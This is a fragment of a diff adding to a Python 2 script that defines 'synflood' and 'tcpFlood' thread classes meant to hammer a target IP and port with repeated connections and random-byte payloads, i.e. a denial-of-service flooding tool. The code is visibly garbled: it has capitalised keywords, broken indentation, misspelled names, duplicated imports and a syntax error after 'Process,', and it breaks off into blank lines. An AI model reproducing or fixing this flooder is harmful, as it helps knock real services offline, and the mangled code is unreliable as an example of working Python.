@@ -16,4 +16,75 @@ Import urllib
 Import re
 Import sys
 Import optparse
+Import os
+Import urlparse
+Import string
+Import random
+Import socket
+Import time
+Import random
+Import random
+Import socket
+Import threading
+Import datetime
+Import random, socket, threading, time, datetime, urllib2, urllib, re, sys, optparse, Os, urlparse
+global term
+from threading import thread
+
+from multiprocessing import Process,
+Manager
+Import urlparse, ssl
+Import sys, getopt, random, time
+
+Import atexit
+from gzip import GzipFile
+from threading import Lock
+from logging import getLogger
+from cStringIO import StringIO
+from httplib import HttpMessage
+from urllib import urlencode, quote
+
+Import urllib2
+Import cookielib
+cookiellib.debug = lambda *a:None
+from socket import setdefaulttimeout
+class synflood (threading.Thread):
+ def__init__(self, ip, port, packets):
+    Self.ip = ip
+    Self.port = port
+    Self.packets = packets
+    Self.syn = socket.socket()
+threading.Thread.___init__(self)
+   def run (self):
+      for i in range(self.packets):
+        try:
+Self.syn.connect((self.ip.port)) 
+    except:
+       pass
+Class tcpFlood(threading.thread):
+      def___init__(ip, port, size, packets):
+           self.ip = ip
+           self.port = port
+           self.size = size
+           self.packets = packets
+           self.tcp =
+socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+threading.Thread.__init__(self)
+    def run(self):
+       for i in range(self.packets):
+          try:
+            bytes =
+random.__urandom(self.size)
+
+
+
+
+
+
+
+
+
+
+
+
 
